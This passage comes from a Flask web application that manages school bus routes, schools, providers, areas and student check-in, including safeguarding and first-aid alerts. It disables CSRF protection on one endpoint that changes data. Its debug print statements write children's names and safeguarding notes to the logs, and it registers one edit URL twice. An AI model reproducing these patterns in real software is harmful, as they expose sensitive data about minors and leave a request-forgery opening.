    if request.method == 'POST':
        name = request.form.get('name')
        address = request.form.get('address')
        contact1_name = request.form.get('contact1_name')
        contact1_role = request.form.get('contact1_role')
        contact1_email = request.form.get('contact1_email')
        contact1_phone = request.form.get('contact1_phone')
        contact2_name = request.form.get('contact2_name')
        contact2_role = request.form.get('contact2_role')
        contact2_email = request.form.get('contact2_email')
        contact2_phone = request.form.get('contact2_phone')
        
        if name and address and contact1_name and contact1_role and contact1_email and contact1_phone:
            updated_school = data_store.update_school(school_id, name, address, contact1_name, contact1_role, contact1_email, contact1_phone,
                                                    contact2_name, contact2_role, contact2_email, contact2_phone)
            flash(f'School "{name}" updated successfully!', 'success')
            return redirect(url_for('schools'))
        else:
            flash('All primary contact fields are required!', 'error')
    
    return render_template('schools.html', schools=data_store.get_all_schools(), edit_school=school)

@app.route('/schools/<school_id>/delete', methods=['POST'])
@login_required
def delete_school(school_id):
    """Delete a school"""
    school = data_store.get_school(school_id)
    if school:
        data_store.delete_school(school_id)
        flash(f'School "{school["name"]}" deleted successfully!', 'success')
    else:
        flash('School not found!', 'error')
    return redirect(url_for('schools'))

@app.route('/schools/csv-template')
@login_required
def download_schools_csv_template():
    """Download CSV template for bulk school upload"""
    csv_content = data_store.create_schools_csv_template()
    
    response = make_response(csv_content)
    response.headers['Content-Type'] = 'text/csv'
    response.headers['Content-Disposition'] = 'attachment; filename=schools_template.csv'
    return response

@app.route('/schools/<school_id>/buses/csv-template')
@login_required
def download_buses_csv_template(school_id):
    """Download CSV template for bulk bus upload"""
    school = data_store.get_school(school_id)
    if not school:
        flash('School not found!', 'error')
        return redirect(url_for('schools'))
    
    csv_content = data_store.create_buses_csv_template()
    
    response = make_response(csv_content)
    response.headers['Content-Type'] = 'text/csv'
    response.headers['Content-Disposition'] = f'attachment; filename=buses_template_{school["name"].replace(" ", "_")}.csv'
    return response

@app.route('/schools/bulk-upload', methods=['POST'])
@admin_required
def bulk_upload_schools():
    """Handle bulk CSV upload of schools"""
    if 'csv_file' not in request.files:
        flash('No file uploaded!', 'error')
        return redirect(url_for('schools'))
    
    file = request.files['csv_file']
    if file.filename == '':
        flash('No file selected!', 'error')
        return redirect(url_for('schools'))
    
    if not file.filename.endswith('.csv'):
        flash('Please upload a CSV file!', 'error')
        return redirect(url_for('schools'))
    
    try:
        csv_content = file.read().decode('utf-8')
        results = data_store.process_schools_csv(csv_content)
        
        # Display results
        success_count = len(results['success'])
        error_count = len(results['errors'])
        
        if success_count > 0:
            flash(f'Successfully uploaded {success_count} schools!', 'success')
        
        if error_count > 0:
            flash(f'{error_count} errors occurred during upload:', 'error')
            for error in results['errors']:
                flash(error, 'error')
                
    except Exception as e:
        flash(f'Error processing file: {str(e)}', 'error')
    
    return redirect(url_for('schools'))

# Route Admin management routes
@app.route('/routes/admin/add', methods=['POST'])
@login_required
def add_route_admin():
    """Add a new route from Route Admin page"""
    route_number = request.form.get('route_number')
    provider_id = request.form.get('provider_id')
    area_id = request.form.get('area_id')
    
    if route_number and provider_id and area_id:
        # Check for duplicate route name
        existing_routes = data_store.get_all_routes()
        route_names = [route.get('route_number', '').lower() for route in existing_routes.values()]
        
        if route_number.lower() in route_names:
            flash(f'Route "{route_number}" already exists! Please choose a different name.', 'error')
            return redirect(url_for('schools'))
        
        # Get the default school (first school in the system)
        schools = data_store.get_all_schools()
        if schools:
            school_id = list(schools.keys())[0]
            route = data_store.create_route(school_id, route_number, provider_id, area_id)
            flash(f'Route "{route_number}" added successfully!', 'success')
        else:
            flash('No school found. Please add a school first!', 'error')
    else:
        flash('All fields are required!', 'error')
    
    return redirect(url_for('schools'))

@app.route('/routes/<route_id>/edit', methods=['POST'])
@login_required
def edit_route_admin(route_id):
    """Edit route from Route Admin page"""
    route = data_store.get_route(route_id)
    if not route:
        flash('Route not found!', 'error')
        return redirect(url_for('schools'))
    
    route_number = request.form.get('route_number')
    provider_id = request.form.get('provider_id')
    area_id = request.form.get('area_id')
    
    if route_number and provider_id and area_id:
        # Check for duplicate route name (excluding current route)
        existing_routes = data_store.get_all_routes()
        for existing_id, existing_route in existing_routes.items():
            if (existing_id != route_id and 
                existing_route.get('route_number', '').lower() == route_number.lower()):
                flash(f'Route "{route_number}" already exists! Please choose a different name.', 'error')
                return redirect(url_for('schools'))
        
        # Get provider and area names for the new data structure
        provider = data_store.get_provider(provider_id)
        area = data_store.get_area(area_id)
        
        data_store.update_route(route_id, 
            route_number=route_number,
            provider_id=provider_id,
            area_id=area_id
        )
        flash(f'Route "{route_number}" updated successfully!', 'success')
    else:
        flash('All fields are required!', 'error')
    
    return redirect(url_for('schools'))

@app.route('/routes/<route_id>/edit-data')
@login_required
def get_route_edit_data(route_id):
    """Get route data for editing"""
    route = data_store.get_route(route_id)
    if not route:
        return jsonify({'success': False, 'message': 'Route not found'})
    
    return jsonify({
        'success': True,
        'route': route
    })

@app.route('/routes/<route_id>/delete', methods=['POST'])
@login_required
def delete_route_admin(route_id):
    """Delete route from Route Admin page"""
    route = data_store.get_route(route_id)
    if route:
        data_store.delete_route(route_id)
        flash(f'Route "{route["route_number"]}" deleted successfully!', 'success')
    else:
        flash('Route not found!', 'error')
    
    return redirect(url_for('schools'))



@app.route('/routes/csv-template')
@login_required
def download_routes_csv_template():
    """Download CSV template for bulk route upload"""
    csv_content = data_store.create_routes_csv_template()
    
    response = make_response(csv_content)
    response.headers['Content-Type'] = 'text/csv'
    response.headers['Content-Disposition'] = 'attachment; filename=routes_template.csv'
    return response

@app.route('/routes/bulk-upload', methods=['POST'])
@admin_required
def bulk_upload_routes():
    """Handle bulk CSV upload of routes"""
    if 'csv_file' not in request.files:
        flash('No file uploaded!', 'error')
        return redirect(url_for('schools'))
    
    file = request.files['csv_file']
    if file.filename == '':
        flash('No file selected!', 'error')
        return redirect(url_for('schools'))
    
    if not file.filename.endswith('.csv'):
        flash('Please upload a CSV file!', 'error')
        return redirect(url_for('schools'))
    
    try:
        csv_content = file.read().decode('utf-8')
        results = data_store.process_routes_csv(csv_content)
        
        # Display results
        success_count = len(results['success'])
        error_count = len(results['errors'])
        
        if success_count > 0:
            flash(f'Successfully uploaded {success_count} routes!', 'success')
        
        if error_count > 0:
            flash(f'{error_count} errors occurred during upload:', 'error')
            for error in results['errors']:
                flash(error, 'error')
                
    except Exception as e:
        flash(f'Error processing file: {str(e)}', 'error')
    
    return redirect(url_for('schools'))

@app.route('/schools/<school_id>/buses/bulk-upload', methods=['POST'])
@login_required
def bulk_upload_buses(school_id):
    """Handle bulk CSV upload of buses for a specific school"""
    school = data_store.get_school(school_id)
    if not school:
        flash('School not found!', 'error')
        return redirect(url_for('schools'))
    
    if 'csv_file' not in request.files:
        flash('No file uploaded!', 'error')
        return redirect(url_for('school_detail', school_id=school_id))
    
    file = request.files['csv_file']
    if file.filename == '':
        flash('No file selected!', 'error')
        return redirect(url_for('school_detail', school_id=school_id))
    
    if not file.filename.endswith('.csv'):
        flash('Please upload a CSV file!', 'error')
        return redirect(url_for('school_detail', school_id=school_id))
    
    try:
        csv_content = file.read().decode('utf-8')
        results = data_store.process_buses_csv(csv_content, school_id)
        
        # Display results
        success_count = len(results['success'])
        error_count = len(results['errors'])
        
        if success_count > 0:
            flash(f'Successfully uploaded {success_count} buses!', 'success')
        
        if error_count > 0:
            flash(f'{error_count} errors occurred during upload:', 'error')
            for error in results['errors']:
                flash(error, 'error')
                
    except Exception as e:
        flash(f'Error processing file: {str(e)}', 'error')
    
    return redirect(url_for('school_detail', school_id=school_id))

@app.route('/schools/<school_id>')
@login_required
def school_detail(school_id):
    """School detail page with buses"""
    school = data_store.get_school(school_id)
    if not school:
        flash('School not found!', 'error')
        return redirect(url_for('schools'))
    
    school_routes = data_store.get_school_routes(school_id)
    drivers = data_store.get_available_drivers()
    guides = data_store.get_staff_by_type('guide')
    students = data_store.get_all_students()
    
    # Add additional information to routes for display
    providers = data_store.get_all_providers()
    areas = data_store.get_school_areas(school_id)
    
    for route in school_routes.values():
        provider = data_store.get_provider(route['provider_id'])
        area = data_store.get_area(route['area_id'])
        
        route['provider_name'] = provider['name'] if provider else 'Unknown Provider'
        route['area_name'] = area['name'] if area else 'Unknown Area'
        route['status_color'] = data_store.get_route_status_color(route['status'])
        route['status_text'] = data_store.get_route_status_text(route['status'])
    
    return render_template('school_detail.html', 
                         school=school, 
                         routes=school_routes,
                         providers=providers,
                         areas=areas,
                         drivers=drivers,
                         guides=guides,
                         students=students,
                         staff_dict=data_store.get_all_staff())

@app.route('/schools/<school_id>/routes/add', methods=['POST'])
@login_required
def add_route(school_id):
    """Add a new route to a school"""
    school = data_store.get_school(school_id)
    if not school:
        flash('School not found!', 'error')
        return redirect(url_for('schools'))
    
    route_number = request.form.get('route_number')
    provider_id = request.form.get('provider_id')
    area_id = request.form.get('area_id')
    
    if route_number and provider_id and area_id:
        route = data_store.create_route(school_id, route_number, provider_id, area_id)
        flash(f'Route "{route_number}" added successfully!', 'success')
    else:
        flash('All fields are required!', 'error')
    
    return redirect(url_for('school_detail', school_id=school_id))

# Provider management routes
@app.route('/providers')
@login_required
def providers():
    """Providers management page"""
    all_providers = data_store.get_all_providers()
    return render_template('providers.html', providers=all_providers)

@app.route('/providers/add', methods=['POST'])
@login_required
def add_provider():
    """Add a new provider"""
    name = request.form.get('name')
    contact_name = request.form.get('contact_name')
    contact_phone = request.form.get('contact_phone')
    contact_email = request.form.get('contact_email')
    
    if name and contact_name and contact_phone:
        provider = data_store.create_provider(name, contact_name, contact_phone, contact_email)
        
        # Check if this is an AJAX request (from Route Admin page)
        if request.headers.get('X-Requested-With') == 'XMLHttpRequest' or request.args.get('ajax') == '1':
            return jsonify({
                'success': True,
                'provider': {
                    'id': provider['id'],
                    'name': provider['name']
                }
            })
        else:
            flash(f'Provider "{name}" added successfully!', 'success')
            return redirect(url_for('providers'))
    else:
        error_msg = 'Name, contact name, and phone are required!'
        
        # Check if this is an AJAX request
        if request.headers.get('X-Requested-With') == 'XMLHttpRequest' or request.args.get('ajax') == '1':
            return jsonify({'success': False, 'message': error_msg})
        else:
            flash(error_msg, 'error')
            return redirect(url_for('providers'))

@app.route('/areas/add', methods=['POST'])
@csrf.exempt
@login_required
def add_area_admin():
    """Add a new area"""
    name = request.form.get('name')
    description = request.form.get('description', '')
    
    # Validate text inputs for profanity
    if name:
        is_valid, error_msg = profanity_filter.validate_educational_content(name, "area name")
        if not is_valid:
            # Check if this is an AJAX request
            if request.headers.get('X-Requested-With') == 'XMLHttpRequest' or request.args.get('ajax') == '1':
                return jsonify({'success': False, 'message': error_msg})
            else:
                flash(error_msg, 'error')
                return redirect(url_for('schools'))
    
    if description:
        is_valid, error_msg = profanity_filter.validate_educational_content(description, "area description")
        if not is_valid:
            # Check if this is an AJAX request
            if request.headers.get('X-Requested-With') == 'XMLHttpRequest' or request.args.get('ajax') == '1':
                return jsonify({'success': False, 'message': error_msg})
            else:
                flash(error_msg, 'error')
                return redirect(url_for('schools'))
    
    if name:
        # Get the default school (first school in the system)
        schools = data_store.get_all_schools()
        if schools:
            school_id = list(schools.keys())[0]
            area_id = data_store.create_area(name, school_id, description)
            
            # Check if this is an AJAX request (from Route Admin page)
            if request.headers.get('X-Requested-With') == 'XMLHttpRequest' or request.args.get('ajax') == '1':
                return jsonify({
                    'success': True,
                    'area': {
                        'id': area_id,
                        'name': name
                    }
                })
            else:
                flash(f'Area "{name}" added successfully!', 'success')
                return redirect(url_for('schools'))
        else:
            error_msg = 'No school found. Please add a school first!'
            
            # Check if this is an AJAX request
            if request.headers.get('X-Requested-With') == 'XMLHttpRequest' or request.args.get('ajax') == '1':
                return jsonify({'success': False, 'message': error_msg})
            else:
                flash(error_msg, 'error')
                return redirect(url_for('schools'))
    else:
        error_msg = 'Area name is required!'
        
        # Check if this is an AJAX request
        if request.headers.get('X-Requested-With') == 'XMLHttpRequest' or request.args.get('ajax') == '1':
            return jsonify({'success': False, 'message': error_msg})
        else:
            flash(error_msg, 'error')
            return redirect(url_for('schools'))

@app.route('/areas/edit', methods=['POST'])
@login_required
def edit_area_admin():
    """Edit an existing area"""
    area_id = request.form.get('area_id')
    name = request.form.get('name')
    
    if not area_id or not name:
        return jsonify({'success': False, 'message': 'Area ID and name are required'})
    
    # Validate text inputs for profanity
    is_valid, error_msg = profanity_filter.validate_educational_content(name, "area name")
    if not is_valid:
        return jsonify({'success': False, 'message': error_msg})
    
    # Check if area exists
    area = data_store.get_area(area_id)
    if not area:
        return jsonify({'success': False, 'message': 'Area not found'})
    
    # Update area
    updated_area = data_store.update_area(area_id, name, area['school_id'], '')
    
    return jsonify({
        'success': True,
        'area': {
            'id': updated_area['id'],
            'name': updated_area['name']
        }
    })

@app.route('/areas/delete', methods=['POST'])
@login_required
def delete_area_admin():
    """Delete an area"""
    area_id = request.form.get('area_id')
    
    if not area_id:
        return jsonify({'success': False, 'message': 'Area ID is required'})
    
    # Check if area exists
    area = data_store.get_area(area_id)
    if not area:
        return jsonify({'success': False, 'message': 'Area not found'})
    
    # Check if area has routes assigned
    routes = data_store.get_all_routes()
    routes_using_area = [r for r in routes.values() if r.get('area_id') == area_id]
    
    if routes_using_area:
        route_names = [r.get('route_number', 'Unknown') for r in routes_using_area]
        return jsonify({
            'success': False, 
            'message': f'Cannot delete area. It is used by routes: {", ".join(route_names)}'
        })
    
    # Delete area
    if data_store.delete_area(area_id):
        return jsonify({'success': True, 'message': 'Area deleted successfully'})
    else:
        return jsonify({'success': False, 'message': 'Failed to delete area'})

@app.route('/providers/<provider_id>/edit', methods=['POST'])
@login_required
def edit_provider(provider_id):
    """Edit a provider"""
    name = request.form.get('name')
    contact_name = request.form.get('contact_name')
    contact_phone = request.form.get('contact_phone')
    contact_email = request.form.get('contact_email')
    
    if name and contact_name and contact_phone:
        provider = data_store.update_provider(provider_id, name, contact_name, contact_phone, contact_email)
        if provider:
            flash(f'Provider "{name}" updated successfully!', 'success')
        else:
            flash('Provider not found!', 'error')
    else:
        flash('Name, contact name, and phone are required!', 'error')
    
    return redirect(url_for('providers'))

@app.route('/providers/<provider_id>/delete', methods=['POST'])
@login_required
def delete_provider(provider_id):
    """Delete a provider"""
    if data_store.delete_provider(provider_id):
        flash('Provider deleted successfully!', 'success')
    else:
        flash('Provider not found!', 'error')
    
    return redirect(url_for('providers'))

# Area management routes
@app.route('/schools/<school_id>/areas')
@login_required
def school_areas(school_id):
    """Areas management page for a school"""
    school = data_store.get_school(school_id)
    if not school:
        flash('School not found!', 'error')
        return redirect(url_for('schools'))
    
    areas = data_store.get_school_areas(school_id)
    
    # Add route count to each area
    for area in areas.values():
        area['routes_count'] = len(data_store.get_routes_by_area(area['id']))
    
    return render_template('areas.html', school=school, areas=areas)

@app.route('/schools/<school_id>/areas/add', methods=['POST'])
@login_required
def add_area(school_id):
    """Add a new area to a school"""
    school = data_store.get_school(school_id)
    if not school:
        flash('School not found!', 'error')
        return redirect(url_for('schools'))
    
    name = request.form.get('name', '').strip()
    description = request.form.get('description', '').strip()
    
    # Validate text inputs for profanity
    if name:
        is_valid, error_msg = profanity_filter.validate_educational_content(name, "area name")
        if not is_valid:
            flash(error_msg, 'error')
            return redirect(url_for('school_areas', school_id=school_id))
    
    if description:
        is_valid, error_msg = profanity_filter.validate_educational_content(description, "area description")
        if not is_valid:
            flash(error_msg, 'error')
            return redirect(url_for('school_areas', school_id=school_id))
    
    if name:
        data_store.create_area(name, school_id, description)
        flash(f'Area "{name}" added successfully!', 'success')
    else:
        flash('Area name is required!', 'error')
    
    return redirect(url_for('school_areas', school_id=school_id))

@app.route('/areas/<area_id>/edit', methods=['POST'])
@login_required
def edit_area(area_id):
    """Edit an area"""
    area = data_store.get_area(area_id)
    if not area:
        flash('Area not found!', 'error')
        return redirect(url_for('schools'))
    
    name = request.form.get('name')
    description = request.form.get('description')
    
    if name:
        data_store.update_area(area_id, name, area['school_id'], description)
        flash(f'Area "{name}" updated successfully!', 'success')
    else:
        flash('Area name is required!', 'error')
    
    return redirect(url_for('school_areas', school_id=area['school_id']))

@app.route('/areas/<area_id>/delete', methods=['POST'])
@login_required
def delete_area(area_id):
    """Delete an area"""
    area = data_store.get_area(area_id)
    if not area:
        flash('Area not found!', 'error')
        return redirect(url_for('schools'))
    
    school_id = area['school_id']
    if data_store.delete_area(area_id):
        flash('Area deleted successfully!', 'success')
    else:
        flash('Area not found!', 'error')
    
    return redirect(url_for('school_areas', school_id=school_id))

@app.route('/routes/<route_id>/edit', methods=['POST'])
@login_required
def edit_route(route_id):
    """Edit an existing route"""
    route = data_store.get_route(route_id)
    if not route:
        flash('Route not found!', 'error')
        return redirect(url_for('dashboard'))
    
    route_name = request.form.get('route_name')
    route_number = request.form.get('route_number')
    capacity = request.form.get('capacity')
    
    if route_name and route_number and capacity:
        try:
            capacity = int(capacity)
            data_store.update_route(route_id, route_name, route_number, capacity)
            flash(f'Route "{route_number}" updated successfully!', 'success')
        except ValueError:
            flash('Capacity must be a number!', 'error')
    else:
        flash('All fields are required!', 'error')
    
    return redirect(url_for('school_detail', school_id=route['school_id']))

@app.route('/routes/<route_id>/delete', methods=['POST'])
@login_required
def delete_route(route_id):
    """Delete a route"""
    route = data_store.get_route(route_id)
    if route:
        school_id = route['school_id']
        data_store.delete_route(route_id)
        flash(f'Route "{route["route_number"]}" deleted successfully!', 'success')
        return redirect(url_for('school_detail', school_id=school_id))
    else:
        flash('Route not found!', 'error')
        return redirect(url_for('dashboard'))

@app.route('/routes/<route_id>/assign-driver', methods=['POST'])
@login_required
def assign_driver_to_route(route_id):
    """Assign a driver to a route"""
    route = data_store.get_route(route_id)
    if not route:
        flash('Route not found!', 'error')
        return redirect(url_for('dashboard'))
    
    driver_id = request.form.get('driver_id')
    if driver_id:
        # Simple assignment - store driver_id in route
        route['driver_id'] = driver_id
        flash('Driver assigned successfully!', 'success')
    else:
        flash('Please select a driver!', 'error')
    
    return redirect(url_for('school_detail', school_id=route['school_id']))

@app.route('/routes/<route_id>/assign-guide', methods=['POST'])
@login_required
def assign_guide_to_route(route_id):
    """Assign a guide to a route"""
    route = data_store.get_route(route_id)
    if not route:
        flash('Route not found!', 'error')
        return redirect(url_for('dashboard'))
    
    guide_id = request.form.get('guide_id')
    if guide_id:
        # Add guide to route's guide list
        if guide_id not in route['guide_ids']:
            route['guide_ids'].append(guide_id)
        flash('Guide assigned successfully!', 'success')
    else:
        flash('Please select a guide!', 'error')
    
    return redirect(url_for('school_detail', school_id=route['school_id']))

@app.route('/routes/<route_id>/status', methods=['POST'])
@login_required
def update_route_status(route_id):
    """Update the status of a route"""
    route = data_store.get_route(route_id)
    if not route:
        flash('Route not found!', 'error')
        return redirect(url_for('dashboard'))
    
    status = request.form.get('status')
    if status in [data_store.BUS_STATUS_NOT_PRESENT, data_store.BUS_STATUS_ARRIVED, data_store.BUS_STATUS_READY]:
        data_store.update_route_status(route_id, status)
        flash(f'Route status updated to {data_store.get_route_status_text(status)}!', 'success')
    else:
        flash('Invalid status!', 'error')
    
    # Check if request came from routes page - validate referrer for security
    if request.referrer and 'routes' in request.referrer and is_safe_url(request.referrer):
        return redirect(url_for('routes'))
    else:
        return redirect(url_for('school_detail', school_id=route['school_id']))

@app.route('/routes/<route_id>/cycle-status', methods=['POST'])
@login_required
def cycle_route_status(route_id):
    """Cycle the status of a route: Not Present -> Arrived -> Ready -> Not Present"""
    print(f"DEBUG: cycle_route_status called with route_id: {route_id}")
    route = data_store.get_route(route_id)
    if not route:
        if request.headers.get('Content-Type') == 'application/json':
            return jsonify({
                'success': False,
                'message': 'Route not found!'
            }), 404
        flash('Route not found!', 'error')
        return redirect(url_for('dashboard'))
    
    print(f"DEBUG: Route {route.get('route_number')} current status: {route.get('status')}")
    
    # Define the cycle order
    current_status = route['status']
    if current_status == data_store.BUS_STATUS_NOT_PRESENT:
        new_status = data_store.BUS_STATUS_ARRIVED
    elif current_status == data_store.BUS_STATUS_ARRIVED:
        new_status = data_store.BUS_STATUS_READY
    else:  # current_status == data_store.BUS_STATUS_READY
        new_status = data_store.BUS_STATUS_NOT_PRESENT
    
    data_store.update_route_status(route_id, new_status)
    status_text = data_store.get_route_status_text(new_status)
    
    print(f"DEBUG: Route {route.get('route_number')} updated to: {new_status}")
    
    # Check if this is an AJAX request (FormData, JSON, or X-Requested-With header)
    is_ajax = (request.headers.get('X-Requested-With') == 'XMLHttpRequest' or
               request.headers.get('Content-Type') == 'application/json' or
               request.form.get('csrf_token') is not None)  # FormData with CSRF indicates AJAX
    
    if is_ajax:
        print(f"DEBUG: Returning JSON response for AJAX request")
        
        message = f'Route status changed to {status_text}!'
        
        return jsonify({
            'success': True,
            'message': message,
            'status': new_status
        })
    
    # Regular form submission - existing logic
    flash(f'Route status changed to {status_text}!', 'success')
    print(f"DEBUG: Route status cycled, checking referrer: {request.referrer}")
    
    # Check if request came from routes page - validate referrer for security
    if request.referrer and 'routes' in request.referrer and is_safe_url(request.referrer):
        print(f"DEBUG: Redirecting to routes page")
        return redirect(url_for('routes'))
    else:
        print(f"DEBUG: Redirecting to school detail page")
        return redirect(url_for('school_detail', school_id=route['school_id']))


@app.route('/routes')
@login_required
def routes():
    """All routes management page"""
    # Class accounts should not have access to Transport Check-in - redirect silently  
    try:
        from models import StaffAccount
        staff_account = StaffAccount.query.filter_by(user_id=current_user.id).first()
        if staff_account and staff_account.account_type == 'class':
            return redirect(url_for('dashboard'))
    except Exception as e:
        print(f"Error checking staff account: {e}")
    
    # CRITICAL: Always reload data from file for cross-device sync
    data_store.load_data_from_file()
    print(f"DEBUG: Reloaded data for routes page - ensuring fresh data")
    
    # Get filter parameters
    area_id = request.args.get('area_id')
    
    # Get ALL routes first for area filter calculation
    all_routes_unfiltered = data_store.get_all_routes()
    
    # Remove consolidated Parent route from all routes
    all_routes_for_areas = {}
    for route_id, route in all_routes_unfiltered.items():
        route_number = route.get('route_number', '')
        if route_number != 'Parent':  # Skip consolidated Parent route
            all_routes_for_areas[route_id] = route
    
    # Get routes for display based on area filter
    if area_id:
        display_routes = data_store.get_routes_by_area(area_id)
        # Filter out consolidated Parent route from display routes too
        filtered_display_routes = {}
        for route_id, route in display_routes.items():
            route_number = route.get('route_number', '')
            if route_number != 'Parent':
                filtered_display_routes[route_id] = route
        display_routes = filtered_display_routes
    else:
        display_routes = all_routes_for_areas
    
    # Use display_routes for the table, all_routes_for_areas for area filters
    all_routes = display_routes
    
    schools = data_store.get_all_schools()
    providers = data_store.get_all_providers()
    all_areas = data_store.get_all_areas()
    students = data_store.get_all_students()
    
    # For Transport Check-in, show only areas that have routes with students assigned
    # but keep all qualifying areas visible for easy switching
    # Use ALL routes (not filtered ones) to determine which areas should be visible
    areas_with_students = {}
    print(f"DEBUG AREAS: Starting area filtering. Current area_id filter: {area_id}")
    print(f"DEBUG AREAS: Total display routes: {len(all_routes)}")
    print(f"DEBUG AREAS: Total routes for area filtering: {len(all_routes_for_areas)}")
    print(f"DEBUG AREAS: Total areas available: {len(all_areas)}")
    
    for route_id, route in all_routes_for_areas.items():
        # Check if this route has students
        route_has_students = False
        for student in students.values():
            if student.get('route_id') == route_id:
                route_has_students = True
                break
        
        print(f"DEBUG AREAS: Route {route.get('route_number')} has students: {route_has_students}")
        
        # If route has students and area exists, include the area
        if route_has_students and route.get('area_id') in all_areas:
            route_area_id = route.get('area_id')
            area = all_areas[route_area_id]
            if area.get('name') != 'Multiple areas':
                areas_with_students[route_area_id] = area
                print(f"DEBUG AREAS: Added area {area.get('name')} to filter list")
    
    areas = areas_with_students
    print(f"DEBUG AREAS: Final areas for filtering: {[area.get('name') for area in areas.values()]}")
    
    # Debug safeguarding data for route C1
    for route_id, route in all_routes.items():
        if route.get('route_number') == 'C1':
            print(f"DEBUG ROUTES: Found C1 route with ID {route_id}")
            print(f"DEBUG ROUTES: C1 student IDs: {route.get('student_ids', [])}")
            safeguarding_count = 0
            for student_id in route.get('student_ids', []):
                student = students.get(student_id)
                if student:
                    print(f"DEBUG ROUTES: Student {student.get('name')}: safeguarding_notes = '{student.get('safeguarding_notes', '')}'")
                    if student.get('safeguarding_notes') and len(student.get('safeguarding_notes', '')) > 0:
                        safeguarding_count += 1
                        print(f"DEBUG ROUTES: -> Student has safeguarding alert")
                    else:
                        print(f"DEBUG ROUTES: -> Student has no safeguarding alert")
            print(f"DEBUG ROUTES: Total safeguarding count for C1: {safeguarding_count}")
            break
    
    # Add additional information to routes for display
    for route_id, route in all_routes.items():
        # Look up actual provider and area names
        provider = data_store.get_provider(route.get('provider_id'))
        area = data_store.get_area(route.get('area_id'))
        
        route['school_name'] = route.get('school_name', 'Hamilton Primary')
        route['provider_name'] = provider['name'] if provider else 'Unknown Provider'
        route['area_name'] = area['name'] if area else 'Unknown Area'
        route['status_color'] = data_store.get_route_status_color(route['status'])
        route['status_text'] = data_store.get_route_status_text(route['status'])
        
        # CRITICAL FIX: Add student count calculation for Check-in page
        # Get students count - for Parent routes, include all students from individual parent routes
        if route['route_number'] == 'Parent':
            # For Parent route, count students from ALL individual parent routes with same provider
            route_students = []
            provider_id = route['provider_id']
            
            # First, get students from individual parent routes
            for route_check_id, route_check in all_routes_unfiltered.items():
                route_name = route_check.get('route_number', '')
                if (route_name.endswith("'s Parent") and 
                    route_check.get('provider_id') == provider_id):
                    # Add students from this individual parent route
                    for student_id in route_check.get('student_ids', []):
                        if student_id in students:
                            route_students.append(students[student_id])
            
            # If no individual routes found, fall back to students directly in Parent route
            if not route_students:
                route_students = [s for s in students.values() if s['id'] in route.get('student_ids', [])]
        else:
            # For regular routes, count students where route_id matches
            route_students = [s for s in students.values() if s.get('route_id') == route_id]
        route['students_count'] = len(route_students)
        
        # Debug logging for count mismatch issues
        if len(route_students) > 0:
            student_names = [s.get('name', 'Unknown') for s in route_students]
            print(f"DEBUG CHECKIN: Route {route['route_number']} (ID: {route_id}) has {len(route_students)} students: {student_names}")
        

    
    # Prepare JSON data for the JavaScript
    areas_by_school = {}
    
    for school_id, school in schools.items():
        # Get areas for this school that have students assigned
        school_areas = {}
        for area_id, area in areas.items():
            if area.get('school_id') == school_id:
                school_areas[area_id] = area
        areas_by_school[school_id] = school_areas
    
    import json
    from datetime import datetime
    
    def json_serialize(obj):
        """Custom JSON serializer for datetime objects"""
        if isinstance(obj, datetime):
            return obj.isoformat()
        raise TypeError(f"Object of type {type(obj)} is not JSON serializable")
    
    areas_json = json.dumps(areas_by_school, default=json_serialize)
    students_json = json.dumps(students, default=json_serialize)
    
    # Calculate route statistics for the tiles
    ready_routes = 0
    arrived_routes = 0
    not_ready_routes = 0
    
    for route_id, route in all_routes.items():
        if route['status'] == data_store.BUS_STATUS_READY:
            ready_routes += 1
        elif route['status'] == data_store.BUS_STATUS_ARRIVED:
            arrived_routes += 1
        elif route['status'] == data_store.BUS_STATUS_NOT_PRESENT:
            not_ready_routes += 1
    
    return render_template('routes.html', 
                         routes=all_routes, 
                         schools=schools, 
                         providers=providers,
                         areas=areas,
                         students=students,
                         selected_area_id=area_id,
                         areas_json=areas_json,
                         students_json=students_json,
                         ready_routes=ready_routes,
                         arrived_routes=arrived_routes,
                         not_arrived_routes=not_ready_routes)

@app.route('/api/route/<route_id>/safeguarding-alerts')
@login_required
def get_route_safeguarding_alerts(route_id):
    """Get safeguarding alerts for students on a specific route"""
    students = data_store.get_all_students()
    
    safeguarding_students = []
    for student_id, student in students.items():
        if student.get('route_id') == route_id and student.get('safeguarding_notes'):
            if len(student.get('safeguarding_notes', '')) > 0:
                safeguarding_students.append({
                    'student_id': student_id,
                    'name': student['name'],
                    'safeguarding_notes': student['safeguarding_notes']
                })
    
    return jsonify({'students': safeguarding_students})

@app.route('/api/route/<route_id>/pediatric-first-aid-alerts')
@login_required
def get_route_pediatric_first_aid_alerts(route_id):
    """Get pediatric first aid alerts for students on a specific route"""
    students = data_store.get_all_students()
    
    pediatric_students = []
    for student_id, student in students.items():
        if student.get('route_id') == route_id:
            requires_pediatric = student.get('requires_pediatric_first_aid')
            if requires_pediatric == 'True' or requires_pediatric == True or requires_pediatric == 'true':
                pediatric_students.append({
                    'student_id': student_id,
                    'name': student['name'],
                    'medical_notes': student.get('medical_notes', '')
                })
    
    return jsonify({'students': pediatric_students})

@app.route('/route/<route_id>/details')
@login_required
def route_details(route_id):
    """View detailed information about a specific route"""
    route = data_store.get_route(route_id)
    if not route:
        flash("Route not found", "error")
        return redirect(url_for('routes'))
    
    provider = data_store.get_provider(route['provider_id'])
    area = data_store.get_area(route['area_id'])
    
    # Get students assigned to this route
    students = []
    for student_id in route.get('student_ids', []):
        student = data_store.get_student(student_id)
        if student:
            students.append((student_id, student))
    
    return render_template('route_details.html', route=route, provider=provider, 
                         area=area, students=students)

@app.route('/routes/add', methods=['POST'])
@login_required
def add_route_from_routes():
    """Add a new route from the routes management page"""
    route_number = request.form.get('route_number')
    school_id = request.form.get('school_id')
    provider_id = request.form.get('provider_id')
    area_selection = request.form.get('area_selection')
    area_id = request.form.get('area_id')
    new_area_name = request.form.get('new_area_name')
    new_area_description = request.form.get('new_area_description')
    selected_students = request.form.getlist('students')
    
    if not route_number or not school_id or not provider_id:
        flash('Route number, school, and provider are required!', 'error')
        return redirect(url_for('routes'))
    
    # Check if route number already exists for this school
    existing_routes = data_store.get_school_routes(school_id)
    if any(route['route_number'] == route_number for route in existing_routes.values()):
        flash(f'Route number "{route_number}" already exists for this school!', 'error')
        return redirect(url_for('routes'))
    
    # Handle area selection or creation
    if area_selection == 'new':
        if not new_area_name:
            flash('Area name is required when creating a new area!', 'error')
            return redirect(url_for('routes'))
        # Create new area
        area = data_store.create_area(new_area_name, school_id, new_area_description)
        area_id = area['id']
    elif not area_id:
        flash('Please select an area or create a new one!', 'error')
        return redirect(url_for('routes'))
    
    # Create the route
